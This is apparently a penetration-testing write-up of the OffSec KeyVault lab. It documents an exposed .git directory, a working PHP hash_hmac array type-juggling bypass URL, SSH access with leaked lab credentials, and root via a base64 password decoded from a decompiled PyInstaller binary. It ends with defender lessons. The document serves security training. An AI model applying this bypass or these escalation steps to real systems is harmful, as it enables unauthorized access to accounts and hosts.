# 🔐 KeyVault — Penetration Testing Writeup

<img width="983" height="731" alt="image" src="https://github.com/user-attachments/assets/0bb0e5df-1a0e-4284-9c21-958974036d2f" />


> **Platform:** OffSec Labs  
> **OS:** Linux — Ubuntu 20.04.4 LTS (x86_64)  
> **Lab Time:** 1h 29m 41s ✅  
> **Author:** Tanvir  

---

## 📋 Table of Contents

- [Overview](#overview)
- [Target Summary](#target-summary)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Initial Foothold — PHP HMAC Bypass](#initial-foothold--php-hmac-bypass)
- [SSH Access](#ssh-access)
- [Privilege Escalation — PyInstaller Binary RE](#privilege-escalation--pyinstaller-binary-re)
- [Root Access](#root-access)
- [Flags](#flags)
- [Attack Chain](#attack-chain)
- [Skills Demonstrated](#skills-demonstrated)
- [Lessons Learned](#lessons-learned)

---

## 🧭 Overview

**KeyVault** is a web application penetration testing lab that demonstrates a PHP HMAC authentication bypass vulnerability to achieve initial access, followed by privilege escalation through reverse engineering a PyInstaller-packed Python binary that contains a base64-encoded root password.

**Key Techniques Used:**
- Exposed `.git` directory enumeration
- PHP type juggling / HMAC bypass (`token[]=` array trick)
- PyInstaller binary unpacking with `pyinstxtractor`
- Python bytecode decompilation with `uncompyle6`
- Base64 credential extraction

---

## 🎯 Target Summary

| Field | Value |
|-------|-------|
| **Target IP** | `192.168.158.207` |
| **OS** | Ubuntu 20.04.4 LTS — Linux 5.4.0-109-generic x86_64 |
| **Open Ports** | 22 (SSH), 80 (HTTP), 8080 (HTTP) |
| **Web App** | KeyVault Password Manager (PHP, Apache 2.4.41) |
| **Initial User** | `ray` |
| **Initial Password** | `Iamsuperstrong3434` |
| **Root Password** | `Mypetdognameisjack909` |
| **local.txt** | `94124bc24d07b9a24b746ec223e82403` |
| **proof.txt** | `7ba41db1c5a38b50f2eaf89b93f92212` |

---

## 🔍 Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sS -sV -sC -A -T5 -p- -Pn 192.168.158.207
```
<img width="902" height="716" alt="image" src="https://github.com/user-attachments/assets/e2122577-4c3c-4634-9ebd-b80fcb7fb41f" />


**Results:**

| Port | State | Service | Version / Info |
|------|-------|---------|----------------|
| `22/tcp` | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 |
| `80/tcp` | open | HTTP | Apache httpd 2.4.41 (Ubuntu) |
| `8080/tcp` | open | HTTP | Apache httpd 2.4.41 (Ubuntu) — **KeyVault Password Manager** |

**Critical Nmap Findings on Port 8080:**

```
[+] Git repository found: http://192.168.158.207:8080/.git/
    .gitignore matched patterns 'secret'
    .git/config matched patterns 'key' 'user'
    Project type: PHP application (guessed from .gitignore)
    Title: KeyVault - Password Manager
    Cookie: PHPSESSID (httponly flag NOT set)
```

> ⚠️ **The `httponly` flag is missing on the session cookie — indicates potential for XSS-based session hijacking as well.**

---

## 🔎 Enumeration

### Port 8080 — Web Application

Visiting `http://192.168.158.207:8080/index.php` reveals the **KeyVault Password Manager** login page with the message:

<img width="1107" height="581" alt="image" src="https://github.com/user-attachments/assets/b6eee706-3acf-4bb8-be9b-89c7122404e5" />


<img width="927" height="146" alt="image" src="https://github.com/user-attachments/assets/2f343266-3761-4d78-9dbb-a2724a24c365" />



```
Code sent to Chris for Review — Until Then this site is protected......
```

Default credentials (`admin:admin`) fail with: **"Invalid login credentials!"**

### Port 8080 — Exposed `.git` Directory


<img width="1124" height="723" alt="image" src="https://github.com/user-attachments/assets/c17c45fc-818e-4fad-9d65-e5e9daa36086" />

The `.git` directory is **publicly accessible** at `http://192.168.158.207:8080/.git/` with directory listing enabled:

```
Index of /.git
COMMIT_EDITMSG    2022-02-04 17:35    27
FETCH_HEAD        2022-03-08 17:29     0
HEAD              2022-02-04 17:34    23
branches/
config            2022-02-04 17:35   152
description       2022-02-04 17:34    73
hooks/
index             2022-02-04 17:35   361
info/
logs/
objects/
refs/
```

> 🔑 This exposes the full application source code, commit history, and potentially hardcoded secrets.

---

## 🚪 Initial Foothold — PHP HMAC Bypass

### Understanding the Vulnerability

The application validates API requests by comparing an HMAC-SHA256 signature. The server-side PHP logic resembles:

```php
// Server-side (vulnerable) logic
$h_expected = hash_hmac('sha256', $_GET['host'], $_GET['token']);
if ($h_expected === $_GET['h']) {
    // authenticated — show credentials
}
```

**The Bug — PHP Type Juggling:**

PHP's `hash_hmac()` function, when passed an **array** as the `key` argument, coerces the value to `false`. This causes `hash_hmac('sha256', $data, false)` to produce a **known, reproducible hash** — one that any attacker can pre-compute locally.

### Step 1 — Generate the Bypass Hash

Create `test.php` on the attacker machine:

```php
<?php
$secret = hash_hmac('sha256', "asd", false);
echo $secret;
?>
```

Execute it:

```bash
php test.php
# 663e7fa98837d5b3e5aa3056efacfc215d2b0ac1e6bfe88df8c715eb26d2d7e8
```

### Step 2 — Craft the Exploit URL

Supply the pre-computed hash as `h`, any string for `host`, and the `token` parameter **as an array** using `token[]=`:

```
http://192.168.158.207:8080/index.php?h=663e7fa98837d5b3e5aa3056efacfc215d2b0ac1e6bfe88df8c715eb26d2d7e8&host=asd&token[]=asd
```

**Why this works:**
- `token[]=asd` → PHP receives an array
- `hash_hmac('sha256', 'asd', ['asd'])` → key coerces to `false`
- `hash_hmac('sha256', 'asd', false)` → produces the same predictable hash
- ✅ **HMAC check bypassed**

### Step 3 — Credentials Extracted

The **KeyVault Password Manager** dashboard is now accessible and leaks stored credentials:

| User | Password |
|------|----------|
| `Ray` | `Iamsuperstrong3434` |

---

## 🔑 SSH Access

Using the extracted credentials:

```bash
ssh ray@192.168.158.207
# ray@192.168.158.207's password: Iamsuperstrong3434
```

<img width="909" height="699" alt="image" src="https://github.com/user-attachments/assets/1f2deaea-7d0b-4529-ae6b-d345acc57e35" />


Successfully logged in to **Ubuntu 20.04.4 LTS**.

### Retrieve local.txt

```bash
$ pwd
/home/ray
$ ls
local.txt
$ cat local.txt
94124bc24d07b9a24b746ec223e82403
```
<img width="502" height="155" alt="image" src="https://github.com/user-attachments/assets/b9fb8ee7-cec5-4be0-8c07-75e0b7fa2a0f" />


---

## ⬆️ Privilege Escalation — PyInstaller Binary RE

### System Enumeration

```bash
$ sudo -l
# User ray may not run sudo on keyvault.

$ ls /opt
apache-restart
```

No sudo rights. However, an unusual binary `apache-restart` sits in `/opt` — a classic privesc indicator.

### Step 1 — Transfer the Binary

On the **victim** machine (ray's shell):

```bash
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000...
```
<img width="855" height="123" alt="image" src="https://github.com/user-attachments/assets/20b7002e-5a71-479f-bd43-a96b3ff70431" />


On the **attacker** machine (Kali):

```bash
wget http://192.168.158.207:8000/apache-restart
```
<img width="1654" height="231" alt="image" src="https://github.com/user-attachments/assets/e0e69d3a-c690-44a6-a8e6-7327f1a81ed0" />


### Step 2 — Identify the Binary

The binary is a **PyInstaller-packed Python executable** — a technique that bundles Python scripts and their interpreter into a single standalone binary.

### Step 3 — Extract with pyinstxtractor

```bash
# Clone the extractor tool
git clone https://github.com/extremecoders-re/pyinstxtractor.git
cd pyinstxtractor

# Copy the binary into the working directory
cp /root/apache-restart .

# Run the extractor
python pyinstxtractor.py apache-restart
```
<img width="1031" height="487" alt="image" src="https://github.com/user-attachments/assets/c7a884b5-6c77-4f7b-9e49-aac1511b48a2" />


Output:

<img width="1616" height="621" alt="image" src="https://github.com/user-attachments/assets/532f4dcd-eb4c-4179-9af9-371f9f41e552" />


```
[+] Processing apache-restart
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 6007628 bytes
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot03_bootstrap.pyc
[+] Possible entry point: apache-restart.pyc
[+] Successfully extracted pyinstaller archive: apache-restart

You can now use a python decompiler on the pyc files within the extracted directory
```

This creates `apache-restart_extracted/` containing the `.pyc` bytecode files.

### Step 4 — Decompile the Python Bytecode

Using **uncompyle6** to reverse the `.pyc` back to readable Python:

<img width="588" height="242" alt="image" src="https://github.com/user-attachments/assets/2f260a4a-4d9a-4225-b86a-1fe91a1860d0" />



```python
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.6 (main, Oct 8 2023, 05:06:43) [GCC 13.2.0]
# Embedded file name: apache-restart.py

import os, base64, time

password = "TXlwZXRkb2duYW1laXNqYWNrOTA5"
sec = base64.b64decode(password).decode("utf-8")

print("Restarting Apache Server without root.... \n")
cmd = os.popen("su -c '/bin/systemctl restart apache2' ", "w").write(sec)
time.sleep(0.3)
print("\nDone")
```

> 🔑 The **root password is hardcoded** in the script, base64-encoded!

### Step 5 — Decode the Password

<img width="565" height="40" alt="image" src="https://github.com/user-attachments/assets/5b1e7fa1-c869-448e-8a70-546987431e65" />

```bash
echo "TXlwZXRkb2duYW1laXNqYWNrOTA5" | base64 -d
# Mypetdognameisjack909
```

---

## 👑 Root Access

Switch to root using the recovered password:

```bash
$ su
Password: Mypetdognameisjack909

root@keyvault:/opt# id
uid=0(root) gid=0(root) groups=0(root)
```

### Retrieve proof.txt

<img width="1276" height="412" alt="image" src="https://github.com/user-attachments/assets/1183599c-9695-4fab-8774-9c461e05cb6a" />

```bash
root@keyvault:~# ls
proof.txt  snap
root@keyvault:~# cat proof.txt
7ba41db1c5a38b50f2eaf89b93f92212
```

---

## 🏁 Flags

| Flag | User | Hash |
|------|------|------|
| **local.txt** | `ray` | `94124bc24d07b9a24b746ec223e82403` |
| **proof.txt** | `root` | `7ba41db1c5a38b50f2eaf89b93f92212` |

---

## 🗺️ Attack Chain

```
Target: 192.168.158.207
│
├── [Recon] nmap -sS -sV -sC -A -T5 -p- -Pn
│       └── Port 8080: Apache + PHP App + .git exposed
│
├── [Enumeration] http://192.168.158.207:8080/.git/
│       └── Confirmed PHP source code exposure
│
├── [Exploit] PHP HMAC Bypass
│       ├── hash_hmac('sha256', 'asd', false) → pre-computed hash
│       └── token[]=asd → array coercion → auth bypassed
│               └── Credentials: ray:Iamsuperstrong3434
│
├── [Initial Access] ssh ray@192.168.158.207
│       └── local.txt: 94124bc24d07b9a24b746ec223e82403
│
├── [Post-Exploitation] /opt/apache-restart (PyInstaller binary)
│       ├── python3 -m http.server → wget binary to Kali
│       ├── pyinstxtractor.py → extract .pyc
│       ├── uncompyle6 → decompile bytecode
│       └── base64 decode → root password: Mypetdognameisjack909
│
└── [Root] su → Mypetdognameisjack909
        └── proof.txt: 7ba41db1c5a38b50f2eaf89b93f92212 ✅
```

---

## 🛡️ Skills Demonstrated

| Skill | Application |
|-------|-------------|
| **Web Application Penetration Testing** | Identified and exploited PHP HMAC authentication bypass |
| **Web Security Testing (OWASP Top 10)** | A07: Identification & Authentication Failures — type juggling |
| **Manual Vulnerability Exploitation** | Hand-crafted exploit URL without automated scanners |
| **Password Cracking** | Decoded base64-encoded credentials from decompiled binary |
| **Post-Exploitation Techniques** | File transfer via Python HTTP server, binary analysis |
| **Privilege Escalation (Linux)** | Recovered hardcoded root credentials from custom binary |
| **Misconfiguration Identification** | Exposed `.git` dir, missing `httponly` flag, hardcoded secrets |
| **Binary Reverse Engineering** | Unpacked PyInstaller archive, decompiled Python bytecode |
| **Penetration Testing** | Full attack chain: recon → exploit → foothold → root |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **Always check for exposed `.git` directories** — they leak source code, credentials, and commit history. Tools like `git-dumper` can automate this.
- **PHP type juggling is a classic OWASP vulnerability.** Passing an array to `hash_hmac()` coerces the key to `false`, producing a predictable hash that destroys authentication integrity.
- **Binaries in `/opt` are a common privesc vector.** Always inspect unusual executables — especially ones related to system services.
- **PyInstaller binaries are fully reversible.** `pyinstxtractor` + `uncompyle6` can recover the original Python source from any packed executable.
- **Secrets inside compiled binaries are not secure.** Base64 encoding is obfuscation, not encryption.

### 🔵 For Defenders

- **Never deploy `.git` in a web-accessible directory.** Block access in `.htaccess` or keep repos outside the web root entirely.
- **Validate and sanitize all user input types in PHP.** Use strict type checking (`===`) and validate that `$_GET['token']` is a string before passing it to cryptographic functions.
- **Never hardcode credentials in scripts or binaries.** Use a proper secrets manager (HashiCorp Vault, AWS Secrets Manager, environment variables).
- **Set `httponly` and `Secure` flags on all session cookies** to mitigate XSS-based session theft.
- **Audit custom binaries and automation scripts** for embedded credentials, especially those running with elevated privileges.

---

*Writeup by **Tanvir** | KeyVault Lab — Completed in 1h 29m 41s*
